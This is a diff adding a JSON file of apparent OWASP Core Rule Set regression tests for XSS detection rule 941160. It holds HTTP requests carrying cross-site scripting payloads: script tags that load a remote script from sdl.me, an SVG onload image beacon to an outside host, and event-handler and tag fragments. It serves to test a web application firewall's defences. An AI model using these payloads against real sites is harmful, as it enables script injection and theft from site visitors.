@@ -1,0 +1,514 @@
+[
+  {
+    "name": "CRS 941160-1: XSS in XML Test as described in http://www.client9.com/article/five-interesting-injection-attacks/",
+    "method": "GET",
+    "uri": "/get/demo/xss/xml/vuln.xml.php?input=<script+xmlns=\"http://www.w3.org/1999/xhtml\">setTimeout(\"top.frame2.location=\"javascript:(function+()+{var+x+=+document.createElement(\\\\\"script\\\\\");x.src+=+\\\\\"//sdl.me/popup.js?//\\\\\";document.childNodes\\\\[0\\\\].appendChild(x);}());\"\",1000)</script>&//",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941160
+    ]
+  },
+  {
+    "name": "CRS 941160-2: XSS in XML Test as described in http://www.client9.com/article/five-interesting-injection-attacks/",
+    "method": "GET",
+    "uri": "/get/char_test?mime=text/xml&body=%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%20src=%22data:,alert(1)%22%20/%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941160
+    ]
+  },
+  {
+    "name": "CRS 941160-3: just another XSS teststring: <x onend=",
+    "method": "GET",
+    "uri": "/get/char_test?mime=text/xml&body=%3Cx%20onend%3D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941160
+    ]
+  },
+  {
+    "name": "CRS 941160-4: just another XSS teststring: \"onzoom=",
+    "method": "GET",
+    "uri": "/get/char_test?mime=text/xml&body=%22onzoom%3D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941160
+    ]
+  },
+  {
+    "name": "CRS 941160-5: just another XSS teststring: 'formaction=",
+    "method": "GET",
+    "uri": "/get/char_test?mime=text/xml&body=%27formaction%3D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941160
+    ]
+  },
+  {
+    "name": "CRS 941160-6: just another XSS teststring:< x: script",
+    "method": "GET",
+    "uri": "/get/char_test?mime=text/xml&body=%3C%20x%3A%20script",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941160
+    ]
+  },
+  {
+    "name": "CRS 941160-7: just another XSS teststring:<f o r m",
+    "method": "GET",
+    "uri": "/get/char_test?mime=text/xml&body=$%3Cf%20o%20r%20m",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941160
+    ]
+  },
+  {
+    "name": "CRS 941160-8: just another XSS teststring: '<f o r m' in User-Agent header",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent %3Cf%20o%20r%20m"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941160
+    ]
+  },
+  {
+    "name": "CRS 941160-9: just another XSS teststring: '<f o r m' in Referer header",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Referer",
+        "https://coreruleset.org/?%3Cf%20o%20r%20m"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941160
+    ]
+  },
+  {
+    "name": "CRS 941160-10: just another XSS teststring: '<f o r m' in Cookie name",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Cookie",
+        "PHPSESSID%3Cf%20o%20r%20m=1234"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941160
+    ]
+  },
+  {
+    "name": "CRS 941160-11: just another XSS teststring: '<f o r m' in Cookie value",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Cookie",
+        "PHPSESSID=1234%3Cf%20o%20r%20m"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941160
+    ]
+  },
+  {
+    "name": "CRS 941160-12: just another XSS teststring: '<f o r m' in ARG NAME",
+    "method": "GET",
+    "uri": "/get?foo%3Cf%20o%20r%20m=bar",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941160
+    ]
+  },
+  {
+    "name": "CRS 941160-13: just another XSS teststring: '<f o r m' in ARG VALUE",
+    "method": "GET",
+    "uri": "/get?foo=bar%3Cf%20o%20r%20m",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941160
+    ]
+  },
+  {
+    "name": "CRS 941160-14: SVG onload injection with remote image",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "132"
+      ]
+    ],
+    "body": "var=%27%22%3E%3Csvg%2Fonload%3D%28new%28Image%29%29.src%3D%27%2F%2Fm8vzjd10riomx3yxblmcnvaskjghsdz8xorciu7%5C56coreruleset.org%27%3E",
+    "expect_ids": [
+      941160
+    ]
+  },
+  {
+    "name": "CRS 941160-15: SVG onload injection in filename",
+    "method": "GET",
+    "uri": "/get/index.php/%3Csvg/onload=alert()",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941160
+    ]
+  },
+  {
+    "name": "CRS 941160-16: Detect XSS injection of 'dialog' tag ('<d i a l o g')",
+    "method": "GET",
+    "uri": "/get?mime=text/xml&body=$%3Cd%20i%20a%20l%20o%20g",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941160
+    ]
+  },
+  {
+    "name": "CRS 941160-17: Test with long event name to trigger 941160: onwebkitplaybacktargetavailabilitychanged",
+    "method": "GET",
+    "uri": "/get?body=%3C%22onwebkitplaybacktargetavailabilitychanged%3D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941160
+    ]
+  },
+  {
+    "name": "CRS 941160-18: GHSA: 941160 payload via XML attribute injection (verifies XML://@* coverage)",
+    "method": "POST",
+    "uri": "/post",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Content-Type",
+        "application/xml"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "369"
+      ]
+    ],
+    "body": "<?xml version=\"1.0\"?><root><a probe=\"&lt;script xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;setTimeout(&quot;top.frame2.location=&quot;javascript:(function () &#x7B;var x = document.createElement(\\\\&quot;script\\\\&quot;);x.src = \\\\&quot;//sdl.me/popup.js?//\\\\&quot;;document.childNodes\\\\[0\\\\].appendChild(x);&#x7D;());&quot;&quot;,1000)&lt;/script&gt;\"></a></root>",
+    "expect_ids": [
+      941160
+    ]
+  }
+]
